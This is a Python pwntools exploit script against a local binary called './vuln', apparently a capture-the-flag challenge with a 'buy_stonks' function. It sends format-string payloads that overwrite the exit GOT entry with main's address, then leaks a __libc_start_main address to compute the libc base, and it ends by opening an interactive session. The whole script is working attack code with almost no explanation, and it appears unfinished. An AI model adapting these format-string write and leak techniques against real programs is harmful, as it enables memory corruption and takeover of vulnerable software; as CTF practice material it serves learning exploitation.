from pwn import *

local_bin = "./vuln"
elf = ELF(local_bin)
rop = ROP(elf)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

p = gdb.debug(local_bin, '''
  set follow-fork-mode parent
  #break buy_stonks
  break *buy_stonks+224
  continue
  '''
  )

p.sendlineafter("portfolio", "1")

exit_got = elf.got['exit']
print("Exit_got = ",hex(exit_got))  #0x602068
start_got = elf.symbols['main']
print("start_got = ",hex(start_got))  #0x400b95
OFFSET_PUTS_GOT = elf.got['puts']
print("PUTS_GOT = ", hex(OFFSET_PUTS_GOT))  #0x602020

number_of_char = (str(exit_got - 0x68 + 2)).encode()
number_of_char2 = (str(0xEAEB)).encode()

print(number_of_char2)

payload = b'%p_' * 10
payload += b'%' + number_of_char + b'c' #0x06020ce vs 0x602068
payload += b'%n'  #0x7fffffffe520
payload += b'%p_' * 6
payload += b'%' + number_of_char2 + b'c' #0x06020ce vs 0x602068
payload += b'%hn' #exit_got | initial = 0x400766 | | required = 0x400b95
p.sendlineafter("token?", payload)

print("Successfully rewrite exit_got to start")

p.sendlineafter("portfolio", "1")


number_of_char = (str(OFFSET_PUTS_GOT - 0x68 + 2)).encode()

payload = b'%p_' * 29  #0x7ffff7e16d0a __libc_start_main + 234


p.sendlineafter("token?", payload)

output = p.recvuntil(b'Portfolio')
leak = output[-25:-11]
print("leak = ", leak)
leak_dec = int(leak,16)
print("[+] leak_dec = ", (leak_dec))
libc_base = leak_dec - 234 - libc.sym["__libc_start_main"]
print("[+] libc base = ", hex(libc_base))

p.interactive()